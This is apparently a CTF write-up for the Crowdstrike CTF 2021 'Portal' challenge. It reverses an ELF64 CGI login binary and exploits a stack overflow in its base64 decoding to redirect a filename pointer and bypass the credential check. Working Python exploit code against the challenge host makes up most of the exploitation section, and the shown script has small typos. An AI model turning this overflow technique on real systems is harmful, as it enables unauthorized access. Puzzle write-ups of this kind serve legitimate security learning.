---
layout: post
title: Crowdstrike CTF 2021 - Portal
author: hugsy
tags: [Protective Penguin,pwn,re,elf64,]
date: 2021-01-29 19:43
---

* Competition: [Crowdstrike CTF](https://adversary.zone/challenges)
* Challenge Name: Portal
* Points: 1 pts
* Description:
> PROTECTIVE PENGUIN gained access to one of their victims through the victim's extranet authentication portals and we were asked to investigate.
> Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.

The target for this challenge is located at https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi. By opening the Qemu image we can get retrieve the ELF64 file: `cgi-bin/portal.cgi`. That "portal" is fairly basic, only asking for credentials.

# Reversing the binary

The binary was quickly identified:

```bash
$ file cgi-bin/portal.cgi
cgi-bin/portal.cgi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aead4fc5b1de633c95bfc8076a8338c9f64c3125, for GNU/Linux 3.2.0, stripped
$ checksec cgi-bin/portal.cgi
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

First, we determined the logic of the binary: it is a ELF64 CGI that is spawned via `python3 -m http.server --cgi`. This has several implications: CGIs are forked and execv-ed so this rules out any kind of stack canary bruteforce (if any canary attack was needed), and also relying on static libc addresses. But the binary base itself will be static.

Moving on to reversing: the `main` function quickly shows that the binary gets the `user` and `pass` from the input formatted in JSON. Also it shows that if the `auth` function is successful (i.e. returns 0), the flag is simply given to us:

![img](https://i.imgur.com/XBOlhQe.png)

Here is the core of the `auth` function
![img](https://i.imgur.com/tjyzEAQ.png)

Its logic is:

1. Read HTTP POST `user` and `pass` as `application/json`
2. Both parameters must be base64 encoded
3. Read expected string from "creds.txt".
4. Do `strcmp("given:credz","fromfile:credz")`
5. If returns 0, it just dumps the flag

After spending some time thinking of using a timing attack for exploitation, we re-read the binary disassembly to spot a stack overflow when the `auth` uses `__b64_pton` on a static stack buffer when extracting the credentials. We fully control the content being extracted. So here we go!

# Exploitation

Trigger the stack overflow is not hard, only providing an input big enough would suffice. For example this code:

```python
s = requests.Session()
u = b64(b"A"*372)
r = s.post("http://localhost:8000/cgi-bin/portal.cgi", json={"user": u, "pass": u})
print(r.text)
s.close()
```

would corrupt the stack, but also overwrite the canary triggering `__stack_chk_fail` and we don't like that much.
But booking closely at the stack layout, we realize something:

```
                     ^
|            |       |
--------------       |
|   pc       |       |
--------------       |
|  sfp       |       |
--------------       |
| canary     |       |
--------------       |
|  fname     |       |
--------------       |
|            |       |  stack direction
|            |       |
| controlled |       |
| buffer     |       |
|            |       |
|            |       |
```

We can control the value being passed to `fopen`! So we can use that argument to point to an address that will be `fopen` for comparison. By default, it obviously points to `creds.txt` (i.e. 0x402008). But if we could point it to a file we know that may contain `:` character, then we have all we need to pass the call to `strcmp`.

And one case struck out
```bash
$ strings cgi-bin/portal.cgi | rg /
/lib64/ld-linux-x86-64.so.2
```

Not quite sure if it was the intended solution, but it worked: we grepped`/lib64/ld-linux-x86-64.so.2` looking for `:` and we get some interesting stuff:

```bash
$ strings /lib64/ld-linux-x86-64.so.2 | rg ':'
[...]
FATAL: kernel too old
Unused direct dependencies:
        Version information:
        %s:
prelink checking: %s
wrong ELF class: ELFCLASS32
undefined symbol: %s%s%s
relocation processing: %s%s
calling init: %s
calling preinit: %s
[...]
```

We are free to pick any: so I picked `b"\tVersion information:"`. All is needed now is build the parameter with an `user` having the base64-encoded value of `b"\tVersion information"`, and `pass` with `\0` is enough.

```python
import os, sys, requests, time
from base64 import b64encode as b64
from pwn import *

TARGET="https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi"

def pwn():
    user_raw = b"\tVersion information"
    user = b64(user_raw)
    pwd_raw = b"\0"*(259-len(u_r))
    pwd = b64(pwd_raw + p64(0x4002a8) + b"A"*8) # 0x4002a8 is the address of /lib64/ld-linux-x86-64.so.2 in portal.cgi

    r = request.post(TARGET, json={"user": user, "pass": pwd})
    if len(r.text):
        print(r.text)
    return

if __name__ == "__main__":
    pwn()
```

And we get the flag printed out after a bunch of junk, showing `CS{w3b_vPn_h4xx}`.



